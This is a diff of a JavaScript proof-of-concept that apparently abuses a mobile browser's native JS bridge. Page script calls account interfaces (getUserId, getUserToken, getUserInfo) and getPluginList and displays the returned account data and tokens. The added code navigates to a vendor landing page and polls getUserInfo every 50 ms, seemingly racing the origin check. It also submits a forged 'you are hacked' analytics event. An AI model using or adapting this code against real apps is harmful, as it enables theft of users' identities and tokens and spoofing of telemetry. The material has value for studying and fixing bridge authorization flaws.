@@ -258,146 +258,176 @@
             callbackFromNative: k
         };
     }
-	
-	  // 活动SDK初始化（保持不变）
-        x("wiseopercampaign");
 
-        function getUserId(params, success, fail) {
-            window.nativeBridge.invoke(
-                "wiseopercampaignbridge", // 修复1：bridgeName 与初始化一致
-                "account",
-                "getUserId",
-                params || [], // 优化：params 未传时默认空数组，避免 undefined
-                success,
-                fail // 修复2：移除多余逗号
-            );
-        }
+    // 活动SDK初始化（保持不变）
+    x("wiseopercampaign");
 
-        function getUserInfo(params, success, fail) {
-            window.nativeBridge.invoke(
-                "wiseopercampaignbridge", // 修复1：bridgeName 与初始化一致
-                "account",
-                "getUserInfo",
-                params || [], // 优化：params 未传时默认空数组，避免 undefined
-                success,
-                fail // 修复2：移除多余逗号
-            );
-        }
+    function getUserId(params, success, fail) {
+        window.nativeBridge.invoke(
+            "wiseopercampaignbridge", // 修复1：bridgeName 与初始化一致
+            "account",
+            "getUserId",
+            params || [], // 优化：params 未传时默认空数组，避免 undefined
+            success,
+            fail // 修复2：移除多余逗号
+        );
+    }
 
-        function getUserToken(params, success, fail) {
-            window.nativeBridge.invoke(
-                "wiseopercampaignbridge", // 修复1：bridgeName 与初始化一致
-                "account",
-                "getUserToken",
-                params || [], // 优化：params 未传时默认空数组，避免 undefined
-                success,
-                fail // 修复2：移除多余逗号
-            );
-        }
+    function getUserInfo(params, success, fail) {
+        window.nativeBridge.invoke(
+            "wiseopercampaignbridge", // 修复1：bridgeName 与初始化一致
+            "account",
+            "getUserInfo",
+            params || [], // 优化：params 未传时默认空数组，避免 undefined
+            success,
+            fail // 修复2：移除多余逗号
+        );
+    }
 
-        window.wiseopercampaign.account = window.wiseopercampaign.account || {};
-        window.wiseopercampaign.account.getUserId = getUserId;
-        window.wiseopercampaign.account.getUserInfo = getUserInfo;
-        window.wiseopercampaign.account.getUserToken = getUserToken;
+    function getUserToken(params, success, fail) {
+        window.nativeBridge.invoke(
+            "wiseopercampaignbridge", // 修复1：bridgeName 与初始化一致
+            "account",
+            "getUserToken",
+            params || [], // 优化：params 未传时默认空数组，避免 undefined
+            success,
+            fail // 修复2：移除多余逗号
+        );
+    }
 
-        //下面开始调用JS代码
+    window.wiseopercampaign.account = window.wiseopercampaign.account || {};
+    window.wiseopercampaign.account.getUserId = getUserId;
+    window.wiseopercampaign.account.getUserInfo = getUserInfo;
+    window.wiseopercampaign.account.getUserToken = getUserToken;
+
+    //下面开始调用JS代码
 // 1. 动态创建并注入样式（无需 HTML 样式标签）
-        const style = document.createElement('style');
-        style.textContent = `
+    const style = document.createElement('style');
+    style.textContent = `
           body{padding:20px;font:14px/1.6 sans-serif;background:#f5f7fa}
           #userIdResult{margin-top:15px;padding:15px;background:#fff;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.05)}
           .suc{color:#48bb78}
           .err{color:#e53e3e}
         `;
-        document.head.appendChild(style);
+    document.head.appendChild(style);
 
-        // 2. 动态创建结果展示容器（无需 HTML 结构）
-        const resultContainer = document.createElement('div');
-        resultContainer.id = 'userIdResult';
-        resultContainer.textContent = '正在获取用户ID...';
-        document.body.appendChild(resultContainer);
+    // 2. 动态创建结果展示容器（无需 HTML 结构）
+    const resultContainer = document.createElement('div');
+    resultContainer.id = 'userIdResult';
+    resultContainer.textContent = '正在获取用户ID...';
+    document.body.appendChild(resultContainer);
 
-        // 3. 延迟调用 + 结果渲染（核心逻辑）
-        setTimeout(() => {
-            wiseopercampaign.account.getUserId(
-                {username: "test"},
-                // 成功回调：更新容器内容
-                data => resultContainer.innerHTML = `<div class="suc">✅ getUserId succeed：${JSON.stringify(data)}</div>`,
-                // 失败回调：更新容器内容
-                (err, code) => resultContainer.innerHTML = `<div class="err">❌ getUserId error：${err || '未知错误'}（码：${code || '无'}）</div>`
+    // 3. 延迟调用 + 结果渲染（核心逻辑）
+    setTimeout(() => {
+        wiseopercampaign.account.getUserId(
+            {username: "test"},
+            // 成功回调：更新容器内容
+            data => resultContainer.innerHTML = `<div class="suc">✅ getUserId succeed：${JSON.stringify(data)}</div>`,
+            // 失败回调：更新容器内容
+            (err, code) => resultContainer.innerHTML = `<div class="err">❌ getUserId error：${err || '未知错误'}（码：${code || '无'}）</div>`
+        );
+
+        wiseopercampaign.account.getUserToken(
+            [{
+                "scopes": [],
+                "forceOn": "0",
+                "userTokenOld": "",
+                "extendInfo": {}
+            }],
+            data => resultContainer.innerHTML += `<div class="suc">✅ getUserToken succeed ：${JSON.stringify(data)}</div>`,
+            // 失败回调：更新容器内容
+            (err, code) => resultContainer.innerHTML += `<div class="err">❌ getUserToken error：${err || '未知错误'}（code：${code || '无'}）</div>`
+        );
+
+    }, 100);
+
+
+    // 浏览器JS接口初始化
+    x("hwbr");
+    function eventReport(params, success, fail) {
+        window.nativeBridge.invoke(
+            "_hwbrNative",
+            "report",
+            "eventReport",
+            params || [],
+            success,
+            fail
+        );
+    }
+
+    /**********************************************************************************************/
+    /*
+     * 测试下之前可以调用的getPluginList
+     */
+    function getPluginList(params, success, fail) {
+        window.nativeBridge.invoke(
+            "_hwbrNative",
+            "app",
+            "getPluginList",
+            params || '',
+            success,
+            fail
+        );
+    }
+
+    window.hwbr.app = window.hwbr.app || {};
+    window.hwbr.app.getPluginList = getPluginList;
+    setTimeout(() => {
+        hwbr.app.getPluginList(
+            [],
+            data => resultContainer.innerHTML += `<div class="suc">✅ getPluginList succeed：${JSON.stringify(data)}</div>`,
+            err => resultContainer.innerHTML += `<div class="err">❌ getPluginList error：${JSON.stringify(err)}</div>`
+        );
+    }, 100);
+
+    /**********************************************************************************************/
+
+    /**********************************************************************************************/
+    /*
+     * 延时调用基于jsbr的AccountPlugin的getUserInfo(获取url用了getUrl)
+     */
+    function getUserInfo(params, success, fail) {
+        window.nativeBridge.invoke(
+            "_hwbrNative",
+            "account",
+            "getUserInfo",
+            params || '',
+            success,
+            fail
+        );
+    }
+
+    window.hwbr.account = window.hwbr.account || {};
+    window.hwbr.account.getUserInfo = getUserInfo;
+    setTimeout(() => {
+        location.href = "https://feeds-drcn.cloud.huawei.com.cn/landingpage/latest?docid=1051530684b7721000000000303e9e0&to_app=hwbrowser&dy_scenario=recomm&tn=07e513ba3b8171fbb0e1072e2235f98f75a29b5ce981161f38045bfb52ab1a48&channel=HW_ECOMMERCE_ZH&ctype=news&cpid=666&r=CN&pageType=26&share_to=system"
+        setInterval( () => {
+            hwbr.account.getUserInfo(
+                '',
+                data => resultContainer.innerHTML += `<div class="suc">✅ getUserInfo succeed：${data}</div>`,
+                err => resultContainer.innerHTML += `<div class="err">❌ getUserInfo error：${JSON.stringify(err)}</div>`
             );
+        }, 50)
+    });
 
-            wiseopercampaign.account.getUserToken(
-                [{
-                    "scopes": [],
-                    "forceOn": "0",
-                    "userTokenOld": "",
-                    "extendInfo": {}
-                }],
-                data => resultContainer.innerHTML += `<div class="suc">✅ getUserToken succeed ：${JSON.stringify(data)}</div>`,
-                // 失败回调：更新容器内容
-                (err, code) => resultContainer.innerHTML += `<div class="err">❌ getUserToken error：${err || '未知错误'}（code：${code || '无'}）</div>`
-            );
+    /**********************************************************************************************/
 
-        }, 100);
+    window.hwbr.report = window.hwbr.report || {};
+    window.hwbr.report.eventReport = eventReport;
+    setTimeout(() => {
+        const eventReportJsonStr = JSON.stringify({
+            eventName: 'you are hacked',
+            version:1,
+            info:{extInfo:{'name':'cc'},u:'hahaha'},
+            reportImmediately:true,
+            isOverseaReport:false,
+            isAnonymous:true
+        });
+        hwbr.report.eventReport(
+            [eventReportJsonStr],
+            data => resultContainer.innerHTML += `<div class="suc">✅ report succeed：${JSON.stringify(data)}</div>`,
+            err => resultContainer.innerHTML += `<div class="err">❌ report error：${JSON.stringify(err)}</div>`
+        );
+    }, 100);
 
-
-        // 浏览器JS接口初始化
-        x("hwbr");
-        function eventReport(params, success, fail) {
-            window.nativeBridge.invoke(
-                "_hwbrNative", 
-                "report",
-                "eventReport",
-                params || [], 
-                success,
-                fail 
-            );
-        }
-
-        /**********************************************************************************************/
-        /*
-         * 测试下之前可以调用的getPluginList
-         */
-        function getPluginList(params, success, fail) {
-            window.nativeBridge.invoke(
-                "_hwbrNative",
-                "app",
-                "getPluginList",
-                params || '',
-                success,
-                fail
-            );
-        }
-
-        window.hwbr.app = window.hwbr.app || {};
-        window.hwbr.app.getPluginList = getPluginList;
-        setTimeout(() => {
-            hwbr.app.getPluginList(
-                [],
-                data => resultContainer.innerHTML += `<div class="suc">✅ getPluginList succeed：${JSON.stringify(data)}</div>`,
-                err => resultContainer.innerHTML += `<div class="err">❌ getPluginList error：${JSON.stringify(err)}</div>`
-            );
-        }, 100);
-
-        /**********************************************************************************************/
-
-        window.hwbr.report = window.hwbr.report || {};
-        window.hwbr.report.eventReport = eventReport;        
-        setTimeout(() => {
-            const eventReportJsonStr = JSON.stringify({
-                    eventName: 'you are hacked',
-                    version:1,
-                    info:{extInfo:{'name':'cc'},u:'hahaha'},
-                    reportImmediately:true,
-                    isOverseaReport:false,
-                    isAnonymous:true
-                });
-            hwbr.report.eventReport(
-                [eventReportJsonStr],                
-                data => resultContainer.innerHTML += `<div class="suc">✅ report succeed：${JSON.stringify(data)}</div>`,
-                err => resultContainer.innerHTML += `<div class="err">❌ report error：${JSON.stringify(err)}</div>`
-            );
-        }, 100);
-		
 })();
